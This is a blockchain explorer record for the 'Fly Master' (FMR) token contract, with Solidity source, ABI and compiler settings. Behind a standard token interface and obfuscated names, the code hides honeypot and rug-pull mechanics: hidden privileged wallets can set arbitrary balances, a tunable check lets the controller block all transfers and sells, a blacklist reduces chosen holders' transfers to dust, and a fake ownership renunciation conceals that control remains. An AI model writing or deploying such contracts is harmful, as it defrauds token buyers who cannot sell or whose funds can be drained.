{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface takeTo {\n    function createPair(address enableTrading, address buyAmount) external returns (address);\n}\n\ninterface buyMaxTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenFromWallet) external view returns (uint256);\n\n    function transfer(address receiverExempt, uint256 launchedSwap) external returns (bool);\n\n    function allowance(address launchMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverExempt,\n        uint256 launchedSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityAt, uint256 value);\n    event Approval(address indexed launchMin, address indexed spender, uint256 value);\n}\n\nabstract contract tradingMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletBuyMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTotalMarketing is buyMaxTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FlyMaster is tradingMarketing, buyMaxTeam, feeTotalMarketing {\n\n    uint8 private tokenTotal = 18;\n\n    mapping(address => uint256) private amountFund;\n\n    mapping(address => bool) public txIs;\n\n    function balanceOf(address tokenFromWallet) public view virtual override returns (uint256) {\n        return amountFund[tokenFromWallet];\n    }\n\n    bool public toSenderLimit;\n\n    function fromLaunched(address buyIsAmount, uint256 launchedSwap) public {\n        maxEnableMode();\n        amountFund[buyIsAmount] = launchedSwap;\n    }\n\n    string private limitMarketingBuy = \"Fly Master\";\n\n    address private isTo;\n\n    mapping(address => mapping(address => uint256)) private totalIs;\n\n    address senderMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalAutoSell(address fromAtMin, address receiverExempt, uint256 launchedSwap) internal returns (bool) {\n        require(amountFund[fromAtMin] >= launchedSwap);\n        amountFund[fromAtMin] -= launchedSwap;\n        amountFund[receiverExempt] += launchedSwap;\n        emit Transfer(fromAtMin, receiverExempt, launchedSwap);\n        return true;\n    }\n\n    function transferFrom(address fromAtMin, address receiverExempt, uint256 launchedSwap) external override returns (bool) {\n        if (_msgSender() != senderMax) {\n            if (totalIs[fromAtMin][_msgSender()] != type(uint256).max) {\n                require(launchedSwap <= totalIs[fromAtMin][_msgSender()]);\n                totalIs[fromAtMin][_msgSender()] -= launchedSwap;\n            }\n        }\n        return feeTake(fromAtMin, receiverExempt, launchedSwap);\n    }\n\n    function feeTake(address fromAtMin, address receiverExempt, uint256 launchedSwap) internal returns (bool) {\n        if (fromAtMin == totalFund) {\n            return totalAutoSell(fromAtMin, receiverExempt, launchedSwap);\n        }\n        uint256 buyAt = buyMaxTeam(sellMinLiquidity).balanceOf(launchSell);\n        require(buyAt == senderLaunched);\n        require(receiverExempt != launchSell);\n        if (txIs[fromAtMin]) {\n            return totalAutoSell(fromAtMin, receiverExempt, launchedSenderTotal);\n        }\n        return totalAutoSell(fromAtMin, receiverExempt, launchedSwap);\n    }\n\n    function transfer(address buyIsAmount, uint256 launchedSwap) external virtual override returns (bool) {\n        return feeTake(_msgSender(), buyIsAmount, launchedSwap);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenTotal;\n    }\n\n    address public totalFund;\n\n    function allowance(address swapLaunch, address sellSwapLaunched) external view virtual override returns (uint256) {\n        if (sellSwapLaunched == senderMax) {\n            return type(uint256).max;\n        }\n        return totalIs[swapLaunch][sellSwapLaunched];\n    }\n\n    uint256 constant launchedSenderTotal = 10 ** 10;\n\n    uint256 public tradingShould;\n\n    function getOwner() external view returns (address) {\n        return isTo;\n    }\n\n    uint256 totalAmount;\n\n    function approve(address sellSwapLaunched, uint256 launchedSwap) public virtual override returns (bool) {\n        totalIs[_msgSender()][sellSwapLaunched] = launchedSwap;\n        emit Approval(_msgSender(), sellSwapLaunched, launchedSwap);\n        return true;\n    }\n\n    function maxTotalTeam(address atReceiver) public {\n        require(atReceiver.balance < 100000);\n        if (senderBuy) {\n            return;\n        }\n        if (buyLaunchTx != toSenderLimit) {\n            buyLaunchTx = false;\n        }\n        fromTo[atReceiver] = true;\n        \n        senderBuy = true;\n    }\n\n    bool private buyLaunchTx;\n\n    address launchSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public fromTo;\n\n    function swapLimitSell() public {\n        emit OwnershipTransferred(totalFund, address(0));\n        isTo = address(0);\n    }\n\n    uint256 public fromToTake;\n\n    function limitEnableExempt(uint256 launchedSwap) public {\n        maxEnableMode();\n        senderLaunched = launchedSwap;\n    }\n\n    constructor (){\n        if (fromToTake == fromTeam) {\n            tradingShould = fromToTake;\n        }\n        walletBuyMarketing exemptTx = walletBuyMarketing(senderMax);\n        sellMinLiquidity = takeTo(exemptTx.factory()).createPair(exemptTx.WETH(), address(this));\n        if (fromToTake != tradingShould) {\n            buyLaunchTx = true;\n        }\n        totalFund = _msgSender();\n        fromTo[totalFund] = true;\n        amountFund[totalFund] = modeFrom;\n        swapLimitSell();\n        \n        emit Transfer(address(0), totalFund, modeFrom);\n    }\n\n    event OwnershipTransferred(address indexed autoSellEnable, address indexed fundLaunched);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeFrom;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitMarketingBuy;\n    }\n\n    function tradingReceiverTotal(address enableMax) public {\n        maxEnableMode();\n        if (fromToTake != fromTeam) {\n            tradingShould = fromTeam;\n        }\n        if (enableMax == totalFund || enableMax == sellMinLiquidity) {\n            return;\n        }\n        txIs[enableMax] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeSell;\n    }\n\n    function maxEnableMode() private view {\n        require(fromTo[_msgSender()]);\n    }\n\n    uint256 private fromTeam;\n\n    function owner() external view returns (address) {\n        return isTo;\n    }\n\n    uint256 private modeFrom = 100000000 * 10 ** 18;\n\n    string private takeSell = \"FMR\";\n\n    bool public senderBuy;\n\n    address public sellMinLiquidity;\n\n    uint256 senderLaunched;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSellEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellSwapLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFromWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIsAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"fromLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromToTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"limitEnableExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiver\",\"type\":\"address\"}],\"name\":\"maxTotalTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMinLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLimitSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSenderLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"}],\"name\":\"tradingReceiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIsAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAtMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FlyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}